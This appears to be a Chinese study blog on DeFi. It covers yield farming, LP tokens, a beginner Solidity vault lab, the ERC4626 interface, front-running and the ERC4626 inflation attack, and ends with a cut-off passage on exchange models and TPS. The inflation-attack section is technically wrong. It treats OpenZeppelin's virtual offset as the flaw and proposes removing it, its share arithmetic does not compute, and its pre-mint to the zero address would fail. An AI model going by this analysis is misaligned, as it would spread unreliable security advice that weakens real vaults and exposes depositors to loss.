<p><strong>Yield Farming（收益耕作）</strong> 是 <strong>DeFi（去中心化金融）</strong> 中的一种策略，指用户将自己的加密资产存入特定协议（如借贷、流动性池、收益聚合器）中，以赚取额外收益（通常是利息或平台代币奖励）的行为。</p>
<p>简单来说，<strong>Yield Farming 就是“把加密货币拿去生钱”</strong>，类似于传统金融里的“存款生息 + 活期理财”，但更复杂、收益更高、风险也更大。</p>
</blockquote>
<hr>
<h3 id="典型项目"><a href="#典型项目" class="headerlink" title="典型项目"></a><strong>典型项目</strong></h3><p>✅ <strong>Yearn Finance</strong><br> 最经典的 Vault 应用，用户存入稳定币、ETH 或 LP Token，Vault 会自动将资金部署到 Curve、Compound 等平台，执行收益优化策略。</p>
<p>✅ <strong>Beefy Finance</strong><br> 多链收益聚合器，Vault 帮助用户将流动性挖矿奖励复投，提升收益。</p>
<hr>
<h3 id="简单理解"><a href="#简单理解" class="headerlink" title="简单理解"></a><strong>简单理解</strong></h3><p>如果把 DeFi 理解为“数字银行”，那么 <strong>Vault &#x3D; 自动理财管家</strong>：</p>
<ul>
<li>你把钱交给 Vault（智能合约）</li>
<li>它帮你找高收益、做复投</li>
<li>省去手动搬砖的麻烦</li>
</ul>
<h2 id="LP-Token"><a href="#LP-Token" class="headerlink" title="LP Token"></a>LP Token</h2><p><strong>LP Token（Liquidity Provider Token，流动性提供者代币）</strong> 是 <strong>用户向去中心化交易所（DEX）或流动性池提供流动性后获得的凭证代币</strong>，它代表着用户在池子中所占的份额。</p>
<blockquote>
<p> <strong>LP Token &#x3D; 你在流动性池的股份证明，可以提币、分红、甚至去挖矿。</strong></p>
</blockquote>
<hr>
<h3 id="为什么会有-LP-Token？"><a href="#为什么会有-LP-Token？" class="headerlink" title="为什么会有 LP Token？"></a><strong>为什么会有 LP Token？</strong></h3><p>在 <strong>Uniswap、SushiSwap、Curve</strong> 等 AMM（自动做市商）模型的 DEX 中，交易对（如 ETH&#x2F;USDC）需要资金池提供流动性。<br> 当你往池子里存入等价值的两种资产（例如 1 ETH + 2000 USDC），你就成为了 <strong>流动性提供者（Liquidity Provider, LP）</strong>。<br> 为了证明你存入了多少，系统会给你发一个 <strong>LP Token</strong>，这就是你的 <strong>股份凭证</strong>。</p>
<hr>
<h3 id="LP-Token-的作用"><a href="#LP-Token-的作用" class="headerlink" title="LP Token 的作用"></a><strong>LP Token 的作用</strong></h3><ol>
<li><strong>提现凭证</strong><ul>
<li>以后你要从池子里取出资金，必须用 LP Token 去兑换你的资产（本金 + 交易手续费分红）。</li>
</ul>
</li>
<li><strong>收益分配</strong><ul>
<li>交易产生的手续费会按 LP Token 占比分给 LP 持有人。</li>
</ul>
</li>
<li><strong>参与 DeFi 挖矿（Liquidity Mining）</strong><ul>
<li>你可以拿 LP Token 去 <strong>质押（Stake）</strong>，获取额外奖励（比如治理代币）。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a><strong>举例</strong></h3><ul>
<li>你往 Uniswap 的 ETH&#x2F;USDC 池子存了 1 ETH + 2000 USDC</li>
<li>系统给你 10 个 LP Token</li>
<li>池子总价值是 100 ETH + 200,000 USDC（假设 LP Token 总量 1000）</li>
<li>你的 LP Token 占比 &#x3D; 10 &#x2F; 1000 &#x3D; 1%</li>
<li>所以，你拥有池子中 <strong>1% 的资金份额和手续费收益</strong>。</li>
</ul>
<hr>
<h3 id="风险"><a href="#风险" class="headerlink" title="风险"></a><strong>风险</strong></h3><ul>
<li><strong>无常损失（Impermanent Loss）</strong>：如果 ETH 价格大涨或大跌，你最终取出的资产组合可能少于单纯持币的价值。</li>
<li><strong>合约风险</strong>：LP Token 本身是由智能合约发行，如果合约被攻击，你可能损失资金。</li>
<li><strong>代币贬值</strong>：如果奖励代币暴跌，实际收益降低。</li>
</ul>
<h2 id="Vault01实验"><a href="#Vault01实验" class="headerlink" title="Vault01实验"></a>Vault01实验</h2><h3 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h3><p>实现一个基础的Vault合约，并结合ERC20代币，完成用户的<strong>充值（deposit）</strong>和<strong>取款（withdraw）</strong>逻辑。</p>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="1-USDT合约"><a href="#1-USDT合约" class="headerlink" title="1. USDT合约"></a><strong>1. USDT合约</strong></h4><p><strong>合约路径</strong>：<code>ERC20_fortest.sol</code><br> <strong>功能描述</strong>：<br> 该合约基于 OpenZeppelin 提供的 <code>ERC20</code> 标准，实现了一个名为 <strong>Tether USD（USDT）</strong> 的代币，主要用于模拟稳定币的发行。</p>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a><strong>代码</strong></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.20;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract USDT is ERC20 &#123;</span><br><span class="line">    constructor(uint256 initialSupply) ERC20(&quot;Tether USD&quot;, &quot;USDT&quot;) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>功能特点</strong>：</p>
<ul>
<li>使用 OpenZeppelin <code>ERC20</code> 标准库，安全且兼容性强。</li>
<li>构造函数中通过 <code>_mint()</code> 为部署者铸造初始代币。</li>
</ul>
<h4 id="2-Vault01合约"><a href="#2-Vault01合约" class="headerlink" title="2. Vault01合约"></a><strong>2. Vault01合约</strong></h4><p><strong>合约路径</strong>：<code>Vault01.sol</code><br> <strong>功能描述</strong>：<br> 该合约实现一个资金池（Vault），用户可以存入 ERC20 代币并获得对应的 <strong>shares</strong>，shares 代表用户在池中的份额。用户可通过 shares 按比例赎回对应的代币。</p>
<h4 id="核心逻辑"><a href="#核心逻辑" class="headerlink" title="核心逻辑"></a><strong>核心逻辑</strong></h4><ul>
<li><strong>存款（deposit）</strong>：<br> 用户将代币转入合约地址，并按规则获得对应份额（shares）。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*  </span><br><span class="line">        a = amount  </span><br><span class="line">        B = balance of token before deposit  </span><br><span class="line">        T = share total supply  </span><br><span class="line">        s = shares to mint  </span><br><span class="line"></span><br><span class="line">        (T + s) / T = (a + B) / B        </span><br><span class="line">        s = aT / B  </span><br><span class="line">        */ </span><br></pre></td></tr></table></figure>



<ul>
<li><strong>取款（withdraw）</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*  </span><br><span class="line">        a = amount  </span><br><span class="line">        B = balance of token before deposit  </span><br><span class="line">        T = share total supply  </span><br><span class="line">        s = shares to redeem  </span><br><span class="line">        &amp;nbsp;</span><br><span class="line">        &amp;nbsp;</span><br><span class="line">        (T - s) / T = (B - a) / B         &amp;nbsp;</span><br><span class="line">        a = sB / T   &amp;nbsp;</span><br><span class="line">        */</span><br></pre></td></tr></table></figure>



<h4 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a><strong>核心代码</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.7.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/interfaces/IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Vault01 &#123;</span><br><span class="line">    IERC20 public immutable token;</span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">    constructor(address _token) &#123;</span><br><span class="line">        token = IERC20(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __mint(address _to, uint256 _shares) private &#123;</span><br><span class="line">        totalSupply += _shares;</span><br><span class="line">        balanceOf[_to] += _shares;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __burn(address _from, uint256 _shares) private &#123;</span><br><span class="line">        totalSupply -= _shares;</span><br><span class="line">        balanceOf[_from] -= _shares;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(uint256 _amount) external &#123;</span><br><span class="line">        uint256 shares;</span><br><span class="line">        if (totalSupply == 0) &#123;</span><br><span class="line">            shares = _amount;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            shares = (_amount * totalSupply) / token.balanceOf(address(this));</span><br><span class="line">        &#125;</span><br><span class="line">        __mint(msg.sender, shares);</span><br><span class="line">        token.transferFrom(msg.sender, address(this), _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _shares) external &#123;</span><br><span class="line">        uint256 amount = (_shares * token.balanceOf(address(this))) / totalSupply;</span><br><span class="line">        __burn(msg.sender, _shares);</span><br><span class="line">        token.transfer(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol>
<li><p><strong>部署 USDT 合约</strong></p>
<ul>
<li>在 Remix 中部署 <code>ERC20_fortest.sol</code>，初始发行 <code>1000000 * 10^18</code> 个代币。</li>
<li>记录 USDT 合约地址，例如 <code>0xABC...123</code>。</li>
</ul>
</li>
<li><p><strong>部署 Vault01 合约</strong></p>
<ul>
<li>构造函数传入 USDT 合约地址 <code>0xABC...123</code>。</li>
<li>Vault01 合约部署完成，等待交互。</li>
</ul>
</li>
<li><p><strong>授权 Vault01 合约转账</strong></p>
<ul>
<li>在 USDT 合约中执行 <code>approve(vaultAddress, amount)</code>。</li>
<li>授权 Vault 可转账指定数量的 USDT。</li>
</ul>
</li>
<li><p><strong>测试存款</strong></p>
<ul>
<li>调用 <code>deposit(100e18)</code>。</li>
<li>验证：<ul>
<li><code>Vault01.balanceOf(msg.sender)</code> 是否增加。</li>
<li><code>Vault01.totalSupply</code> 是否更新。</li>
<li><code>Vault01.token.balanceOf(address(Vault01))</code> 是否为 100 USDT。</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>测试取款</strong></p>
<ul>
<li>调用 <code>withdraw(50e18)</code>。</li>
<li>验证：<ul>
<li>用户账户 USDT 余额恢复。</li>
<li><code>Vault01.totalSupply</code> 减少。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="ERC4626阅读"><a href="#ERC4626阅读" class="headerlink" title="ERC4626阅读"></a>ERC4626阅读</h2><h3 id="assets-shares"><a href="#assets-shares" class="headerlink" title="assets &amp; shares"></a>assets &amp; shares</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC4626 资产与份额接口</span><br><span class="line"></span><br><span class="line">// 资产信息查询</span><br><span class="line">/// @dev 返回金库的基础资产代币地址</span><br><span class="line">function asset() external view returns (address assetTokenAddress);</span><br><span class="line"></span><br><span class="line">/// @dev 返回金库管理的基础代币总额</span><br><span class="line">function totalAssets() external view returns (uint256 totalManagedAssets);</span><br><span class="line"></span><br><span class="line">// 数量转换</span><br><span class="line">/// @dev 将资产数量转换为份额数量</span><br><span class="line">//计算一个币可以转化成多少shares</span><br><span class="line">function convertToShares(uint256 assets) external view returns (uint256 shares);</span><br><span class="line"></span><br><span class="line">/// @dev 将份额数量转换为资产数量</span><br><span class="line">function convertToAssets(uint256 shares) external view returns (uint256 assets);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>包含两个核心功能组：</p>
<ul>
<li>资产信息查询（asset 和 totalAssets）</li>
<li>资产与份额的相互转换（convertToShares 和 convertToAssets）</li>
</ul>
<h3 id="存款-铸造相关函数接口"><a href="#存款-铸造相关函数接口" class="headerlink" title="存款&#x2F;铸造相关函数接口"></a>存款&#x2F;铸造相关函数接口</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC4626 存款与铸造接口</span><br><span class="line"></span><br><span class="line">// 最大可存款/铸造量查询</span><br><span class="line">/// @dev 获取接收者可存入的最大资产数量</span><br><span class="line">function maxDeposit(address receiver) external view returns (uint256 maxAssets);</span><br><span class="line"></span><br><span class="line">/// @dev 获取接收者可铸造的最大份额数量</span><br><span class="line">function maxMint(address receiver) external view returns (uint256 maxShares);</span><br><span class="line"></span><br><span class="line">// 存款/铸造预览</span><br><span class="line">/// @dev 预览存入指定资产数量将获得的份额数量</span><br><span class="line">function previewDeposit(uint256 assets) external view returns (uint256 shares);</span><br><span class="line"></span><br><span class="line">/// @dev 预览铸造指定份额数量需要的资产数量</span><br><span class="line">function previewMint(uint256 shares) external view returns (uint256 assets);</span><br><span class="line"></span><br><span class="line">// 存款/铸造操作</span><br><span class="line">/// @dev 存入资产并给接收者铸造份额</span><br><span class="line">function deposit(uint256 assets, address receiver) external returns (uint256 shares);</span><br><span class="line"></span><br><span class="line">/// @dev 铸造份额并扣除接收者的资产</span><br><span class="line">function mint(uint256 shares, address receiver) external returns (uint256 assets);</span><br></pre></td></tr></table></figure>

<h4 id="receiver的作用是什么？"><a href="#receiver的作用是什么？" class="headerlink" title="receiver的作用是什么？"></a><code>receiver</code>的作用是什么？</h4><p><code>receiver</code> 参数的作用是 <strong>指定存款&#x2F;铸造操作中接收份额（shares）的目标地址</strong>。它的设计目的是实现更灵活的资产托管和委托操作。</p>
<blockquote>
<p>相当于充值给另外一个地址</p>
</blockquote>
<p><strong>与 <code>msg.sender</code> 的区别</strong></p>
<ul>
<li><strong><code>msg.sender</code></strong><br>代表实际调用合约的地址（操作者），通常是支付资产（<code>transferFrom</code>）的地址。</li>
<li><strong><code>receiver</code></strong><br>代表最终获得份额的地址，可能与 <code>msg.sender</code> 相同，也可能不同。</li>
</ul>
<h3 id="提款与赎回接口"><a href="#提款与赎回接口" class="headerlink" title="提款与赎回接口"></a><strong>提款与赎回接口</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC4626 提款与赎回接口</span><br><span class="line"></span><br><span class="line">// ========== 最大可提款/赎回量查询 ==========</span><br><span class="line">/// @dev 获取所有者可提取的最大资产数量（基于其份额）</span><br><span class="line">function maxWithdraw(address owner) external view returns (uint256 maxAssets);</span><br><span class="line"></span><br><span class="line">/// @dev 获取所有者可赎回的最大份额数量</span><br><span class="line">function maxRedeem(address owner) external view returns (uint256 maxShares);</span><br><span class="line"></span><br><span class="line">// ========== 提款/赎回预览计算 ==========</span><br><span class="line">/// @dev 预览提取指定资产数量需要销毁的份额数量</span><br><span class="line">function previewWithdraw(uint256 assets) external view returns (uint256 shares);</span><br><span class="line"></span><br><span class="line">/// @dev 预览赎回指定份额数量将获得的资产数量</span><br><span class="line">function previewRedeem(uint256 shares) external view returns (uint256 assets);</span><br><span class="line"></span><br><span class="line">// ========== 提款/赎回操作 ==========</span><br><span class="line">/// @dev 提取资产（销毁所有者的份额，资产发送给接收者）</span><br><span class="line">function withdraw(</span><br><span class="line">    uint256 assets,</span><br><span class="line">    address receiver,</span><br><span class="line">    address owner</span><br><span class="line">) external returns (uint256 shares);</span><br><span class="line"></span><br><span class="line">/// @dev 赎回份额（销毁所有者的份额，资产发送给接收者）</span><br><span class="line">function redeem(</span><br><span class="line">    uint256 shares,</span><br><span class="line">    address receiver,</span><br><span class="line">    address owner</span><br><span class="line">) external returns (uint256 assets);</span><br></pre></td></tr></table></figure>

<h4 id="核心区别：withdraw-vs-redeem"><a href="#核心区别：withdraw-vs-redeem" class="headerlink" title="核心区别：withdraw vs redeem"></a><strong>核心区别：<code>withdraw</code> vs <code>redeem</code></strong></h4><ol>
<li><strong><code>withdraw</code></strong><ul>
<li>用户指定<strong>想要提取的资产数量</strong>（<code>assets</code>）。</li>
<li>系统自动计算需要销毁的份额（<code>shares</code>），通过 <code>previewWithdraw</code> 预览。</li>
<li>适用场景：用户关注能拿到多少底层资产（如“我要提100 USDC”）。</li>
</ul>
</li>
<li><strong><code>redeem</code></strong><ul>
<li>用户指定<strong>要销毁的份额数量</strong>（<code>shares</code>）。</li>
<li>系统计算可获得的资产数量（<code>assets</code>），通过 <code>previewRedeem</code> 预览。</li>
<li>适用场景：用户关注销毁多少份额（如“我要赎回50 vaultShares”）。</li>
</ul>
</li>
</ol>
<h4 id="为什么需要-owner-和-receiver？"><a href="#为什么需要-owner-和-receiver？" class="headerlink" title="为什么需要 owner 和 receiver？"></a><strong>为什么需要 <code>owner</code> 和 <code>receiver</code>？</strong></h4><ol>
<li><strong><code>owner</code></strong><ul>
<li>代表实际持有份额的地址（必须已授权调用者操作其份额）。</li>
<li>例如：智能合约代理可替用户操作，但份额属于用户地址。</li>
</ul>
</li>
<li><strong><code>receiver</code></strong><ul>
<li>允许将提取的资产发送到第三方地址（如归集钱包或另一个合约）。</li>
<li>例如：用户可指定将资产直接发送到交易所地址。</li>
</ul>
</li>
</ol>
<h3 id="总体："><a href="#总体：" class="headerlink" title="总体："></a>总体：</h3><p><img src="https://s2.loli.net/2025/07/28/1Mb9KoNfjTag4Xs.png" alt="image.png"></p>
<h3 id="两个事件"><a href="#两个事件" class="headerlink" title="两个事件"></a>两个事件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ERC4626 存款/提款事件</span><br><span class="line"></span><br><span class="line">/// @dev 当存入资产并铸造份额时触发</span><br><span class="line">event Deposit(</span><br><span class="line">    address indexed sender,    // 操作者地址（调用合约的地址）</span><br><span class="line">    address indexed owner,     // 份额所有者地址</span><br><span class="line">    uint256 assets,            // 存入的资产数量</span><br><span class="line">    uint256 shares             // 铸造的份额数量</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">/// @dev 当提取资产并销毁份额时触发</span><br><span class="line">event Withdraw(</span><br><span class="line">    address indexed sender,    // 操作者地址（调用合约的地址）</span><br><span class="line">    address indexed receiver,  // 资产接收者地址</span><br><span class="line">    address indexed owner,     // 份额所有者地址</span><br><span class="line">    uint256 assets,            // 提取的资产数量</span><br><span class="line">    uint256 shares             // 销毁的份额数量</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>在 <code>withdraw</code> 操作中，如果 msg.sender !&#x3D;owner那么 msg.sender 需要先请 owner 调用什么方法,才可以让 msg.sender 来 withdraw 成功?</p>
<p>答： <code>approve</code></p>
<h2 id="Front-Running"><a href="#Front-Running" class="headerlink" title="Front - Running"></a>Front - Running</h2><p><strong>Front-Running</strong> 是指恶意节点（FrontRunner）通过监控待处理交易池（Mempool），以更高 Gas 费抢在目标交易（User’s Transaction）之前执行自己的交易，从而获利的行为。以下是分步拆解：</p>
<hr>
<h4 id="1-用户发起交易"><a href="#1-用户发起交易" class="headerlink" title="1. 用户发起交易"></a><strong>1. 用户发起交易</strong></h4><ul>
<li>用户提交一笔交易（如购买代币、调用智能合约）到以太坊网络。  </li>
<li>交易进入待处理池（Mempool），等待矿工&#x2F;验证者打包。</li>
</ul>
<h4 id="2-恶意节点监控交易池"><a href="#2-恶意节点监控交易池" class="headerlink" title="2. 恶意节点监控交易池"></a><strong>2. 恶意节点监控交易池</strong></h4><ul>
<li><strong>FrontRunner</strong>（通常是机器人）实时扫描Mempool，识别有利可图的交易：  <ul>
<li>例如：用户的大额代币买单（可能推高价格）。  </li>
<li>或套利机会（如DEX价格偏差）。</li>
</ul>
</li>
</ul>
<h4 id="3-发起抢先交易"><a href="#3-发起抢先交易" class="headerlink" title="3. 发起抢先交易"></a><strong>3. 发起抢先交易</strong></h4><ul>
<li><strong>策略</strong>：  <ul>
<li>复制用户交易逻辑（如购买同种代币）。  </li>
<li>设置<strong>更高Gas费</strong>，吸引矿工优先打包。</li>
</ul>
</li>
<li><strong>结果</strong>：  <ul>
<li>恶意交易被优先执行，用户交易因Gas低而延后。</li>
</ul>
</li>
</ul>
<h4 id="4-获利手段"><a href="#4-获利手段" class="headerlink" title="4. 获利手段"></a><strong>4. 获利手段</strong></h4><ul>
<li><strong>低买高卖</strong>：抢在用户买单前低价购入代币，待用户交易推高价格后卖出。  </li>
<li><strong>套利</strong>：利用DEX价格延迟，在用户交易前完成价差套利。  </li>
<li><strong>操纵合约</strong>：针对拍卖类合约，提前锁定优势条件。</li>
</ul>
<hr>
<h3 id="技术实现依赖"><a href="#技术实现依赖" class="headerlink" title="技术实现依赖"></a><strong>技术实现依赖</strong></h3><ol>
<li><strong>交易透明性</strong>：以太坊Mempool公开可见，便于监控。  </li>
<li><strong>Gas竞价机制</strong>：矿工优先打包高Gas交易。  </li>
<li><strong>智能合约可预测性</strong>：若合约逻辑固定，攻击者可模拟结果。</li>
</ol>
<hr>
<h3 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a><strong>防御方案</strong></h3><ul>
<li><strong>隐私交易</strong>：使用Flashbots等隐私RPC，避免交易暴露在公开Mempool。  </li>
<li><strong>限价单&#x2F;滑点控制</strong>：设置交易价格上限，减少被利用空间。  </li>
<li><strong>合约级防护</strong>：  <ul>
<li>提交-揭示模式（Commit-Reveal Scheme）。  </li>
<li>随机化关键操作（如拍卖截止时间）。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="典型案例"><a href="#典型案例" class="headerlink" title="典型案例"></a><strong>典型案例</strong></h3><ul>
<li><strong>DeFi套利</strong>：2020年Uniswap上多次出现抢跑套利，单笔获利超万美元。  </li>
<li><strong>NFT铸造</strong>：热门项目公售时，机器人抢先铸造稀缺资产。</li>
</ul>
<p>Front-Running本质是利用区块链透明性和激励机制的设计缺陷，是Web3中典型的”黑暗森林”攻击。</p>
<h3 id="ERC4626-通胀攻击（Inflation-Attack）"><a href="#ERC4626-通胀攻击（Inflation-Attack）" class="headerlink" title="ERC4626 通胀攻击（Inflation Attack）"></a>ERC4626 通胀攻击（Inflation Attack）</h3><h4 id="攻击背景"><a href="#攻击背景" class="headerlink" title="攻击背景"></a><strong>攻击背景</strong></h4><p>ERC4626 是代币化金库（Vault）标准，允许用户存入资产（assets）并获取份额（shares）。攻击者通过操纵金库的 <strong>资产-份额转换比例</strong>，在特定条件下实现“凭空增发份额”的漏洞。</p>
<hr>
<h4 id="攻击场景示例"><a href="#攻击场景示例" class="headerlink" title="攻击场景示例"></a><strong>攻击场景示例</strong></h4><p>假设初始状态：</p>
<ul>
<li>用户存入资产：<code>assets_deposited = 1,000</code></li>
<li>当前总份额：<code>totalSupply() = 1,000</code></li>
<li>金库总资产：<code>totalAssets() = 1,000,000</code><br>此时，用户预期获得的份额应通过公式计算：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shares_received = assets_deposited * totalSupply() / totalAssets()</span><br><span class="line">= 1,000 * 1,000 / 1,000,000 = 1 share</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="漏洞触发点"><a href="#漏洞触发点" class="headerlink" title="漏洞触发点"></a><strong>漏洞触发点</strong></h4><p>问题出在 <code>_convertToShares</code> 函数的实现：  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _convertToShares(uint256 assets, Math.Rounding rounding) </span><br><span class="line">    internal view virtual returns (uint256) &#123;</span><br><span class="line">    return assets.mulDiv(</span><br><span class="line">        totalSupply() + 10 ** _decimalsOffset(), </span><br><span class="line">        totalAssets() + 1,  // 关键问题：分母被 +1 操纵</span><br><span class="line">        rounding</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>攻击步骤</strong>：</p>
<ol>
<li><strong>初始状态</strong>：金库刚部署，<code>totalSupply = 0</code>，<code>totalAssets = 0</code>。</li>
<li><strong>攻击者首次存款</strong>：  <ul>
<li>存入极少量资产（如 1 wei），此时：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shares = 1 * (0 + 1e18) / (0 + 1) = 1e18 shares</span><br></pre></td></tr></table></figure></li>
<li>攻击者以 1 wei 的成本获得 <code>1e18</code> 份额（天文数字）。</li>
</ul>
</li>
<li><strong>正常用户存款</strong>：  <ul>
<li>用户存入 <code>1,000</code> 资产时，因 <code>totalSupply</code> 被攻击者通胀：  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shares = 1,000 * (1e18 + 1e18) / (1 + 1,000) ≈ 2e18 / 1,001 ≈ 2e15 shares</span><br></pre></td></tr></table></figure></li>
<li>用户实际获得的份额远低于预期，大部分价值被攻击者稀释。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="攻击核心逻辑"><a href="#攻击核心逻辑" class="headerlink" title="攻击核心逻辑"></a><strong>攻击核心逻辑</strong></h4><ul>
<li><strong>分母操纵</strong>：<code>totalAssets() + 1</code> 的设计在初始状态下（<code>totalAssets=0</code>）会放大份额计算。</li>
<li><strong>份额通胀</strong>：攻击者通过极低成本获取大量份额，后续用户的存款被严重稀释。</li>
</ul>
<hr>
<h4 id="防御方案-1"><a href="#防御方案-1" class="headerlink" title="防御方案"></a><strong>防御方案</strong></h4><ol>
<li><p><strong>初始化保护</strong>：  </p>
<ul>
<li>在金库部署时预铸少量份额给零地址（如 <code>1e18</code>），避免 <code>totalSupply=0</code> 的极端情况。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function __ERC4626_init(address asset, uint256 initialDeposit) internal &#123;</span><br><span class="line">    _mint(address(0), 1e18); // 预铸份额</span><br><span class="line">    _deposit(initialDeposit, msg.sender); // 初始存款</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>公式修正</strong>：  </p>
<ul>
<li>移除分母的 <code>+1</code> 逻辑，直接使用 <code>assets * totalSupply / totalAssets</code>。</li>
</ul>
</li>
<li><p><strong>最小存款限制</strong>：  </p>
<ul>
<li>要求首次存款必须超过一定阈值（如 <code>1e18</code> wei），提高攻击成本。</li>
</ul>
</li>
</ol>
<hr>
<h4 id="真实案例"><a href="#真实案例" class="headerlink" title="真实案例"></a><strong>真实案例</strong></h4><ul>
<li>2022 年多个未实现防护的 ERC4626 金库（如某些收益聚合器）因此漏洞被攻击，导致用户份额价值被稀释。</li>
</ul>
<p><strong>总结</strong>：ERC4626 通胀攻击利用了初始状态下的数学漏洞，开发者需严格检查资产-份额转换公式的边界条件！</p>
<blockquote>
<p><a href="https://docs.openzeppelin.com/contracts/4.x/erc4626">https://docs.openzeppelin.com/contracts/4.x/erc4626</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>DeFi</tag>
      </tags>
  </entry>
  <entry>
    <title>DEX详解</title>
    <url>/2025/07/31/DEX%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="交易所的盈利来源"><a href="#交易所的盈利来源" class="headerlink" title="交易所的盈利来源"></a>交易所的盈利来源</h1><blockquote>
<p>以币安为例</p>
</blockquote>
<ul>
<li><strong>交易费</strong>:交易所通过提供买卖加密货币的平台来收取交易费用有些交易所还提供高级交易选项，如杠杆交易，这通常会带来更高的费用;</li>
<li><strong>上币费</strong>:项目方团队后面都会去找交易所上币，然而上币需要缴纳一笔数额不小的上币费</li>
<li><strong>量化交易</strong>：用户在交易所中，一般数字资产币都是暂时存放在交易所，基本上交易所掌握所有筹码可以选择做多或者做空易所，所可以去赚取差价，i而用户提币出去也能赚取手续费</li>
<li><strong>原生代币</strong>;</li>
</ul>
<h2 id="中心化交易所的交易模式–订单簿模式"><a href="#中心化交易所的交易模式–订单簿模式" class="headerlink" title="中心化交易所的交易模式–订单簿模式"></a>中心化交易所的交易模式–订单簿模式</h2><ul>
<li>中央限价订单簿(CLOB)就是一本由出价和报价组成的权限透明账本，从最好价开始依次排序(两边分别是参与者愿意买&#x2F;卖的价格)。</li>
<li>所有的参与者都能看到所有的报价和出价，他们也可以参与其中。</li>
<li>订单簿中两边的第一行，即是最好的报价&#x2F;出价。</li>
</ul>
<h3 id="订单簿模式的优劣"><a href="#订单簿模式的优劣" class="headerlink" title="订单簿模式的优劣"></a>订单簿模式的优劣</h3><p><strong>优势:</strong></p>
<ul>
<li>透明的流动性劣势</li>
<li>做市商可自由出入</li>
<li>做市商可以自由决定价格与数量</li>
</ul>
<p><strong>劣势：</strong></p>
<ul>
<li>冷启动问题(很难给出初始流动性)</li>
<li>对非流动性资产不利</li>
<li>如果是链上交易所，则对链的TPS 的要求很高、</li>
</ul>
<p><strong>TPS</strong> 是 <strong>Transactions Per Second</strong>（每秒交易数）的缩写，用于衡量一个区块链网络在单位时间内能够处理交易的速度。它是评估区块链性能（尤其是交易所等高频场景）的关键指标之一。</p>
<hr>
<h4 id="为什么链上交易所对TPS要求很高？"><a href="#为什么链上交易所对TPS要求很高？" class="headerlink" title="为什么链上交易所对TPS要求很高？"></a><strong>为什么链上交易所对TPS要求很高？</strong></h4><ol>
<li><strong>实时交易需求</strong><br>交易所需要快速处理大量用户的买卖订单，低TPS会导致交易延迟、拥堵，用户体验变差（例如牛市时以太坊网络拥堵、Gas费飙升）。</li>
<li><strong>避免交易积压</strong><br>如果TPS过低，未确认的交易会堆积在内存池（mempool）中，可能导致交易失败或需要支付更高手续费来优先处理。</li>
<li><strong>竞争性场景</strong><br>高频交易、套利等操作依赖快速确认，高TPS能减少价格滑点和市场波动带来的风险。</li>
</ol>
<hr>
<h4 id="不同区块链的TPS对比"><a href="#不同区块链的TPS对比" class="headerlink" title="不同区块链的TPS对比"></a><strong>不同区块链的TPS对比</strong></h4><ul>
<li><strong>比特币</strong>：约 3-7 TPS（设计初衷侧重去中心化和安全性，牺牲速度）。</li>
<li><strong>以太坊</strong>：约 15-30 TPS（主网），Layer 2扩容后可达数千TPS。</li>
<li><strong>Solana</strong>：宣称 2,000-65,000 TPS（通过高吞吐量设计）。</li>
<li><strong>BSC（币安智能链）</strong>：约 100-300 TPS。</li>
</ul>
<hr>
